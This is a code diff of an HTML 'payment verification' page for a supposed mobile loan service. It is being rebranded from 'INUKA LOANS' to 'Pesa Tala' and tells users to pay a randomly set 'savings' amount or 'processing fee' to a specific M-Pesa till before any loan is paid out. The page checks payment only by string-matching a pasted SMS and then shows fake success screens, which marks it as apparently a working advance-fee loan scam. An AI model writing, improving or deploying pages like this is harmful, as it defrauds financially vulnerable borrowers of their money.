@@ -3,192 +3,85 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Verify Payment</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom right, #cc2b5e, #753a88);
-      margin: 0;
-      padding: 20px;
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .card {
-      background-color: #1e1e2f;
-      border-radius: 12px;
-      padding: 20px;
-      max-width: 400px;
-      width: 100%;
-      margin-top: 20px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-    }
-
-    h2 {
-      color: #aaff00;
-      text-align: center;
-    }
-
-    p, li {
-      line-height: 1.6;
-    }
-
-    .highlight {
-      font-weight: bold;
-      color: #ffd700;
-    }
-
-    .btn {
-      background: linear-gradient(to right, #ff416c, #ff4b2b);
-      color: white;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-      font-size: 1rem;
-      margin-top: 20px;
-      width: 100%;
-    }
-
-    .btn:hover {
-      background: linear-gradient(to right, #ff4b2b, #ff416c);
-    }
-
-    .copy-btn {
-      margin-top: 10px;
-      background: linear-gradient(to right, #ff9966, #ff5e62);
-    }
-
-    textarea {
-      width: 100%;
-      height: 100px;
-      margin-top: 15px;
-      border-radius: 8px;
-      border: none;
-      padding: 10px;
-      font-size: 0.95rem;
-    }
-
-    .footer {
-      margin-top: 30px;
-      text-align: center;
-      font-size: 0.9rem;
-      color: #ccc;
-    }
-
-    #successSection {
-      display: none;
-      text-align: center;
-      padding: 20px;
-    }
-
-    #timer {
-      font-size: 1.5rem;
-      font-weight: bold;
-      color: #00ffcc;
-      margin-top: 10px;
-    }
-
-    @media (max-width: 480px) {
-      .card {
-        padding: 15px;
-      }
-    }
-  </style>
+  <title>Pesa Tala - Payment Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <h2>ACCOUNT SAVINGS</h2>
+<body class="bg-gradient-to-br from-purple-900 via-purple-800 to-gray-100 min-h-screen flex items-center justify-center px-4 text-white">
 
-  <!-- Main Card Section -->
-  <div class="card" id="formSection">
-    <p>
-      Based on your selected loan amount of <span class="highlight" id="loanAmount">Ksh ...</span>, HAKIKA R PROVISION requires you to save
-      <span class="highlight" id="savingAmount">Ksh ...</span> to your account. This strengthens your credit profile.
-      Savings are withdrawable after successful loan repayment.
+  <div class="bg-white/10 backdrop-blur-md rounded-2xl shadow-2xl max-w-md w-full p-6 border border-purple-400">
+    <h2 class="text-2xl font-bold text-yellow-400 text-center mb-4">🔐 Payment Verification</h2>
+
+    <p class="text-sm text-gray-200 mb-4">
+      To proceed, please make a one-time processing fee payment to your Pesa Tala account using the instructions below.
     </p>
 
-    <button class="btn" onclick="window.location.href='checklimit.html'">Change Savings Plan</button>
+    <!-- Change Savings Plan Button -->
+    <button onclick="window.location.href='checklimit.html'" class="mb-4 w-full bg-yellow-400 hover:bg-yellow-300 text-purple-900 font-bold py-2 rounded-xl shadow transition">
+      Change Savings Plan
+    </button>
 
-    <div style="background:#e8f0fa; color:#000; border-radius:12px; padding:15px; margin-top:20px;">
-      <p><strong>How to save to your INUKA LOANS A/C:</strong></p>
-      <ul style="list-style:none; padding-left:0;">
-        <li>Go to M~Pesa: <strong>M~pesa</strong></li>
-        <li>Lipa na M~Pesa: <strong>Buy Goods & Services</strong></li>
+    <!-- Payment Instructions -->
+    <div class="bg-white text-purple-900 rounded-xl p-4 shadow mb-6 text-sm">
+      <p><strong>How to Pay via M-Pesa:</strong></p>
+      <ul class="list-disc list-inside mt-2 space-y-1">
+        <li>Go to M-Pesa: <strong>M-PESA</strong></li>
+        <li>Lipa na M-Pesa: <strong>LIPA NA MPESA</strong></li>
         <li>Enter Till Number: <strong id="tillNumber">9824375</strong></li>
         <li>
-          <button class="btn copy-btn" onclick="copyTill()">CLICK TO COPY TILL</button>
+          <button onclick="copyTill()" class="mt-2 bg-purple-700 hover:bg-purple-800 text-white px-3 py-1 rounded shadow text-sm">📋 Click to Copy Till</button>
         </li>
-        <li>Enter Amount: <strong id="savingAmount2">Ksh ...</strong></li>
-        <li>Complete Payment: <strong>Enter M~Pesa Pin</strong></li>
+        <li>Enter Amount: <strong id="amountDisplay">Ksh ...</strong></li>
+        <li>Complete Payment: <strong>Enter M-Pesa PIN</strong></li>
       </ul>
     </div>
 
-    <label for="mpesaMessage"><strong>Paste M-Pesa Payment Message:</strong></label>
-    <textarea id="mpesaMessage" placeholder="Paste your M-Pesa message here..."></textarea>
+    <!-- Paste M-Pesa Message -->
+    <label for="mpesaMessage" class="text-sm text-gray-200 font-semibold">Paste M-Pesa Payment Message:</label>
+    <textarea id="mpesaMessage" placeholder="e.g. QES45T8T Confirmed. Ksh 153 sent to HAKIKA R PROVISION..." class="w-full p-3 rounded-lg border mt-2 mb-4 text-black" rows="4"></textarea>
 
-    <button class="btn" onclick="verifyPayment()">Verify Payment to Initiate Loan Disbursement</button>
+    <button onclick="verifyPayment()" class="w-full bg-yellow-400 hover:bg-yellow-300 text-purple-900 font-bold py-2 rounded-xl shadow">
+      ✅ Verify Payment
+    </button>
+
+    <!-- Verification Result -->
+    <div id="result" class="mt-4 text-center font-semibold text-lg hidden"></div>
   </div>
-
-  <!-- Success Section -->
-  <div id="successSection">
-    <h2 style="color:#00ffcc;">✅ Payment Verified!</h2>
-    <p>Your loan disbursement is now being processed.</p>
-    <p>Estimated wait time:</p>
-    <div id="timer">03:00</div>
-  </div>
-
-  <div class="footer">© INUKA LOANS 2025</div>
 
   <script>
-    const loanAmount = parseInt(localStorage.getItem("loanAmount")) || 4790;
-
-    let savingsAmount;
-    if (loanAmount >= 7000) {
-      savingsAmount = Math.floor(Math.random() * (450 - 300 + 1)) + 300;
-    } else if (loanAmount >= 4500) {
-      savingsAmount = Math.floor(Math.random() * (350 - 200 + 1)) + 200;
-    } else {
-      savingsAmount = Math.floor(Math.random() * (250 - 150 + 1)) + 150;
-    }
-
-    document.getElementById("loanAmount").textContent = "Ksh " + loanAmount.toLocaleString();
-    document.getElementById("savingAmount").textContent = "Ksh " + savingsAmount;
-    document.getElementById("savingAmount2").textContent = "Ksh " + savingsAmount;
+    // Retrieve processing fee from localStorage
+    const fee = parseInt(localStorage.getItem("processingFee")) || 0;
+    document.getElementById("amountDisplay").textContent = "Ksh " + fee;
 
     function copyTill() {
       const till = document.getElementById("tillNumber").innerText;
       navigator.clipboard.writeText(till).then(() => {
-        alert("Till number copied: " + till);
+        alert("✅ Till number copied: " + till);
       });
     }
 
     function verifyPayment() {
       const message = document.getElementById("mpesaMessage").value.toUpperCase();
-      if (message.includes("HAKIKA R PROVISION")) {
-        document.getElementById("formSection").style.display = "none";
-        document.getElementById("successSection").style.display = "block";
-        startTimer(3 * 60); // 3 minutes countdown
+      const result = document.getElementById("result");
+
+      if (message.includes("HAKIKA R PROVISION") && message.includes(fee.toString())) {
+        result.textContent = "🎉 Payment Verified Successfully!";
+        result.classList.remove("text-red-500");
+        result.classList.add("text-green-400");
+        result.classList.remove("hidden");
+
+        // Optional: Redirect or enable further steps
+        setTimeout(() => {
+          window.location.href = "dashboard.html";
+        }, 2500);
+
       } else {
-        alert("❌ Verification failed. Make sure the message includes HAKIKA R PROVISION.");
+        result.textContent = "❌ Verification Failed. Ensure the message contains 'HAKIKA R PROVISION' and exact amount 'Ksh " + fee + "'";
+        result.classList.remove("text-green-400");
+        result.classList.add("text-red-500");
+        result.classList.remove("hidden");
       }
     }
-
-    function startTimer(duration) {
-      let timer = duration, minutes, seconds;
-      const timerDisplay = document.getElementById('timer');
-      const interval = setInterval(() => {
-        minutes = Math.floor(timer / 60);
-        seconds = timer % 60;
-        timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-        if (--timer < 0) {
-          clearInterval(interval);
-          timerDisplay.textContent = "00:00";
-        }
-      }, 1000);
-    }
   </script>
+
 </body>
 </html>
